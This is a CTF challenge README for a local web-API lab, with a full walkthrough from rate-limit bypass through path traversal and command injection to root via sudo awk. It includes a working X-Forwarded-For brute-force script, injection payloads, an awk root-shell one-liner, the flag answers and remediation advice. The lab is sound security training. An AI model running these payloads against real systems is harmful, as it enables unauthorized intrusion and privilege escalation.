# Echo - Rate Limit Bypass Challenge

**Status:** ✅ Complete

## Player Description

EverSec's Hardened Login System™ is protected by our state-of-the-art rate limiting! After 5 failed login attempts, we lock you out FOR A WHOLE MINUTE. Take that, hackers! We track your IP address to enforce this. Our intern suggested some complicated "validation" stuff, but we told him to stop over-engineering. Simple is better, right?

## Technical Description

**Category**: Web API Security → RCE → Privilege Escalation
**Difficulty**: Hard
**Points**: 1,600 (5 flags)
**Flags**: 5

EverSec's new authentication system uses a 4-digit PIN, but we've lost it! The system has rate limiting to prevent brute force attacks - only 5 login attempts per minute are allowed. A wordlist of common PINs is provided, but at 5 attempts per minute, brute forcing would take many hours.

Can you bypass the rate limiting, recover the PIN, and escalate your way to root access?

## Learning Objectives

After completing this challenge, participants will understand:
- **Header Manipulation**: How X-Forwarded-For headers work and why they shouldn't be trusted
- **API Rate Limiting**: Bypass techniques for IP-based rate limiting
- **Path Traversal**: Exploiting file read vulnerabilities with `../` sequences
- **Command Injection**: Shell metacharacter abuse in subprocess calls
- **Privilege Escalation**: GTFOBins methodology for sudo exploitation
- **Multi-Stage Attacks**: Chaining vulnerabilities from initial access to root

## Setup Instructions

### Docker Compose (Recommended)

```bash
# From repository root
docker compose up -d echo-rate-limit-bypass

# View logs
docker compose logs -f echo-rate-limit-bypass

# Stop
docker compose down echo-rate-limit-bypass
```

### Standalone Docker

```bash
cd Challenges/echo-rate-limit-bypass

# Build
docker build -t echo-rate-limit-bypass .

# Run
docker run -d -p 4003:4003 --name echo-rate-limit-bypass echo-rate-limit-bypass

# View logs
docker logs -f echo-rate-limit-bypass

# Stop
docker stop echo-rate-limit-bypass && docker rm echo-rate-limit-bypass
```

## Accessing the Challenge

Once running, access the challenge at:
- **Web Interface**: http://localhost:4003
- **API Login**: http://localhost:4003/api/login
- **Wordlist**: http://localhost:4003/wordlist.txt

## Attack Chain Overview

| Flag | Points | Vulnerability | Technique |
|------|--------|---------------|-----------|
| FLAG1 | 200 | X-Forwarded-For trust | Header spoofing → rate limit bypass |
| FLAG2 | 200 | Hidden admin endpoint | Directory enumeration |
| FLAG3 | 300 | Path traversal | File read via `../` |
| FLAG4 | 400 | Command injection | Shell injection → RCE |
| FLAG5 | 500 | Sudo misconfiguration | GTFOBins (awk) → root |

**Total**: 1,600 points

---

## FLAG 1: Rate Limit Bypass (200 points)

### Vulnerability

The application trusts the `X-Forwarded-For` header without validation:

```python
def get_client_ip():
    # VULNERABLE: Trusting X-Forwarded-For without validation
    forwarded_for = request.headers.get('X-Forwarded-For')
    if forwarded_for:
        return forwarded_for.split(',')[0].strip()
    return request.remote_addr
```

Since rate limiting is tracked per IP address, attackers can spoof different IPs to bypass the 5-request limit.

### Exploitation

**Step 1**: Download the wordlist

```bash
curl http://localhost:4003/wordlist.txt -o wordlist.txt
```

**Step 2**: Create exploit script

```python
#!/usr/bin/env python3
import json
from urllib import request as url_request

TARGET_URL = "http://localhost:4003/api/login"
WORDLIST_URL = "http://localhost:4003/wordlist.txt"

def try_pin(pin, fake_ip):
    data = json.dumps({"pin": pin}).encode('utf-8')
    req = url_request.Request(
        TARGET_URL,
        data=data,
        headers={
            'Content-Type': 'application/json',
            'X-Forwarded-For': fake_ip  # Spoof the IP address
        },
        method='POST'
    )

    try:
        with url_request.urlopen(req) as response:
            return json.loads(response.read().decode('utf-8')), response.status
    except Exception as e:
        return None, None

# Download wordlist
with url_request.urlopen(WORDLIST_URL) as response:
    wordlist = response.read().decode('utf-8').strip().split('\n')

print(f"[*] Loaded {len(wordlist)} PINs from wordlist")
print("[*] Starting brute force with X-Forwarded-For bypass...\n")

for i, pin in enumerate(wordlist, 1):
    # Use a different fake IP for each attempt
    fake_ip = f"10.0.{i // 256}.{i % 256}"
    response_data, status_code = try_pin(pin, fake_ip)

    if status_code == 200 and response_data.get('success'):
        print(f"\n[+] SUCCESS! Found correct PIN: {pin}")
        print(f"[+] FLAG1: {response_data.get('flag')}")
        print(f"[+] Token: {response_data.get('token')}")
        break
    else:
        print(f"[-] Attempt {i}: PIN {pin} (IP: {fake_ip}) - Failed", end='\r')
```

**Step 3**: Run the exploit

```bash
python3 exploit.py
```

Output:
```
[+] SUCCESS! Found correct PIN: 7394
[+] FLAG1: r4t3_l1m1t_byp4ss3d
[+] Token: a1b2c3d4e5f6...
```

**FLAG 1**: `r4t3_l1m1t_byp4ss3d`

---

## FLAG 2: Admin Endpoint Discovery (200 points)

### Vulnerability

The login response includes an authentication token, but doesn't document what to do with it. Players must discover the `/api/admin` endpoint through enumeration.

### Exploitation

**Manual Discovery**:

```bash
# Try common admin paths
curl http://localhost:4003/admin           # 404
curl http://localhost:4003/api/admin       # 401 (Unauthorized)

# Use token from FLAG1
TOKEN="a1b2c3d4e5f6..."  # From FLAG1
curl http://localhost:4003/api/admin \
  -H "Authorization: Bearer $TOKEN"
```

**Automated Discovery** (dirb/gobuster):

```bash
gobuster dir -u http://localhost:4003/api/ -w /usr/share/wordlists/dirb/common.txt
```

Response:
```json
{
  "success": true,
  "message": "Admin access granted.",
  "flag": "h1dd3n_4dm1n_r0ut3",
  "admin_data": {
    "total_users": 42,
    "active_sessions": 1,
    "system": "EverSec Auth Gateway v2.1"
  }
}
```

**FLAG 2**: `h1dd3n_4dm1n_r0ut3`

---

## FLAG 3: Path Traversal (300 points)

### Vulnerability

The `/api/logs` endpoint accepts a `file` parameter without path sanitization:

```python
@app.route('/api/logs', methods=['GET'])
def api_logs():
    # Get requested log file (defaults to app.log)
    log_file = request.args.get('file', 'app.log')

    # VULNERABLE: No path sanitization!
    log_path = f'/app/logs/{log_file}'

    with open(log_path, 'r') as f:
        content = f.read()
    return jsonify({'success': True, 'file': log_file, 'content': content})
```

### Exploitation

**Discover the endpoint**:

```bash
# Try common admin paths
curl http://localhost:4003/api/logs \
  -H "Authorization: Bearer $TOKEN"
```

Default response shows `app.log` contents. Now try path traversal:

```bash
# Read flag3.txt
curl http://localhost:4003/api/logs?file=../flag3.txt \
  -H "Authorization: Bearer $TOKEN"
```

Response:
```json
{
  "success": true,
  "file": "../flag3.txt",
  "content": "p4th_tr4v3rs4l_l0gs\n"
}
```

**FLAG 3**: `p4th_tr4v3rs4l_l0gs`

---

## FLAG 4: Command Injection (400 points)

### Vulnerability

The `/api/health` endpoint accepts a `check` parameter that's directly interpolated into a shell command:

```python
@app.route('/api/health', methods=['POST'])
def api_health():
    check_type = data['check']

    # VULNERABLE: Command injection via shell=True
    result = subprocess.run(
        f'df -h | head -n 3 && echo "---" && {check_type}',
        shell=True,
        capture_output=True,
        text=True,
        timeout=5
    )

    return jsonify({'success': True, 'output': result.stdout})
```

### Exploitation

**Test the endpoint**:

```bash
curl -X POST http://localhost:4003/api/health \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"check": "disk"}'
```

**Inject commands**:

```bash
# Read flag4.txt
curl -X POST http://localhost:4003/api/health \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"check": "cat /home/ctfuser/flag4.txt"}'
```

Response:
```json
{
  "success": true,
  "check": "cat /home/ctfuser/flag4.txt",
  "output": "Filesystem      Size  Used Avail Use% Mounted on\noverlay          59G   35G   22G  63% /\n---\nc0mm4nd_1nj3ct10n_rc3\n"
}
```

**FLAG 4**: `c0mm4nd_1nj3ct10n_rc3`

---

## FLAG 5: Sudo Privilege Escalation (500 points)

### Vulnerability

The `ctfuser` account has NOPASSWD sudo access to `/usr/bin/awk`:

```bash
$ sudo -l
User ctfuser may run the following commands:
    (ALL) NOPASSWD: /usr/bin/awk
```

This is a classic GTFOBins privilege escalation vector.

### Exploitation

**Get a shell** (from FLAG4 RCE):

```bash
# Inject a reverse shell or use interactive command injection
curl -X POST http://localhost:4003/api/health \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"check": "sudo -l"}'
```

**Escalate to root** using GTFOBins:

```bash
# Method 1: Direct command execution
curl -X POST http://localhost:4003/api/health \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"check": "sudo awk '\''BEGIN {system(\"cat /root/flag5.txt\")}'\''"}'
```

**Alternative** (if you have shell access):

```bash
# Get shell from FLAG4, then:
sudo awk 'BEGIN {system("/bin/sh")}'
# Now you're root
cat /root/flag5.txt
```

**FLAG 5**: `4wk_sud0_pr1v3sc`

---

## Common Pitfalls

1. **Not noticing source_ip field**: The 429 error response shows your detected IP - this is the hint!
2. **Giving up after rate limiting**: Don't wait 60 seconds, find the bypass
3. **Missing /api/admin**: Endpoint is not documented, requires enumeration
4. **Forgetting Authorization header**: All admin endpoints require Bearer token
5. **Not trying path traversal**: The `/api/logs` endpoint begs for `../` testing
6. **Shell quoting issues**: Command injection payloads need proper escaping
7. **Not checking sudo**: Always run `sudo -l` after gaining shell access

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

You're being rate-limited by IP address. How does a server behind a reverse proxy know the original client's IP? What HTTP header is commonly used for this — and what happens if a server trusts that header without validating it?

</details>

<details>
<summary>Hint 2</summary>

After a successful login, look at the complete API response. Beyond the obvious content, is there anything else in the JSON that might be useful for accessing other parts of the application?

</details>

<details>
<summary>Hint 3</summary>

The admin endpoint requires authentication. Think back through everything the application has given you so far — what credential or token might it accept?

</details>

<details>
<summary>Hint 4</summary>

Authenticated admin APIs sometimes expose more than just data. What kinds of parameters might give an attacker capabilities beyond reading information?

</details>

## Prevention & Remediation

### 1. Never Trust X-Forwarded-For Blindly

```python
TRUSTED_PROXIES = ['10.0.0.1', '172.16.0.1']  # Your actual proxy IPs

def get_client_ip():
    if request.remote_addr in TRUSTED_PROXIES:
        forwarded_for = request.headers.get('X-Forwarded-For')
        if forwarded_for:
            return forwarded_for.split(',')[0].strip()
    return request.remote_addr
```

### 2. Validate File Paths

```python
import os

def api_logs():
    log_file = request.args.get('file', 'app.log')

    # Prevent path traversal
    log_file = os.path.basename(log_file)  # Remove directory components
    log_path = os.path.join('/app/logs', log_file)

    # Ensure path is within allowed directory
    if not os.path.abspath(log_path).startswith('/app/logs/'):
        abort(403)
```

### 3. Never Use shell=True with User Input

```python
# BAD
subprocess.run(f'command {user_input}', shell=True)

# GOOD
subprocess.run(['command', user_input], shell=False)
```

### 4. Restrict Sudo Permissions

```bash
# BAD
ctfuser ALL=(ALL) NOPASSWD: /usr/bin/awk

# GOOD - Don't give sudo access to interpreters/text processors
# Use specific scripts with argument validation instead
ctfuser ALL=(root) NOPASSWD: /usr/local/bin/approved_admin_script.sh
```

### 5. Deploy Behind Reverse Proxy

- Use nginx, HAProxy, or CDN (Cloudflare, AWS ALB)
- Let the proxy handle IP detection
- Never expose application directly to internet
- Proxy sets X-Forwarded-For, app trusts only proxy's IP

## References

- **OWASP**: [Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- **CWE-807**: Reliance on Untrusted Inputs in a Security Decision
- **CWE-22**: Path Traversal
- **CWE-78**: OS Command Injection
- **GTFOBins**: [awk](https://gtfobins.github.io/gtfobins/awk/)
- **OWASP API Security**: [API4:2023 Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)

## Challenge Metadata

- **Author**: EverSec CTF Team
- **Difficulty**: Hard (multi-stage)
- **Category**: Web API Security → RCE → Privilege Escalation
- **Points**: 1,600 (5 flags)
- **Estimated Time**: 30-60 minutes (beginners), 15-30 minutes (experienced)
- **Skills Required**:
  - HTTP header manipulation
  - Directory enumeration
  - Path traversal techniques
  - Command injection
  - Linux privilege escalation
- **Skills Learned**:
  - Rate limiting bypass techniques
  - Multi-stage attack chaining
  - File system attacks
  - RCE exploitation
  - GTFOBins methodology

---

**EverSec Security Solutions** - Teaching secure development through hands-on challenges
